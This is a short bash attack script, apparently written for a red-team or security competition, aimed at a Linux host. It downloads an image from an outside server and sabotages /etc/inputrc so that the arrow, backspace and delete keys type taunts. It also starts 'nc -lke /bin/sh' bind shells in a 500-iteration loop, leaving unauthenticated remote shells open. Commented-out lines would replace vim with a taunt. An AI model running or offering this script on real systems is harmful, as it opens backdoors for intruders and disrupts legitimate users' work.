#!/bin/bash
if [ ! `which curl` ]; then
   apt-get install curl -y
fi
curl http://server.mdbooktech.com/uwubuntu.png > /tmp/uwubuntu.png

#Run the python script
python basic-stuff.py

#Mess with inputs
echo '"\e[A": "u mad bro?"' >> /etc/inputrc
echo '"\e[C": "no typos allowed"' >> /etc/inputrc
echo '"\e[D": "no typos allowed"' >> /etc/inputrc
echo '"\177": "oops"' >> /etc/inputrc
echo '"\b": "oops"' >> /etc/inputrc
echo '"\e[3~": "nope"' >> /etc/inputrc

# Disable vim and vi
# Not using this during the current competition because it ruins editor_shim
# echo "#!/bin/bash" > /usr/bin/vim
# echo "echo use nano, coward" >> /usr/bin/vim
# chmod +x /usr/bin/vim
# echo "echo use nano, coward" > $(which vi)


#Simple bind shell on a ton of random ports
for i in {1..500}
do
   nc -lke /bin/sh &
done

# TODO: chmod +i a bunch of files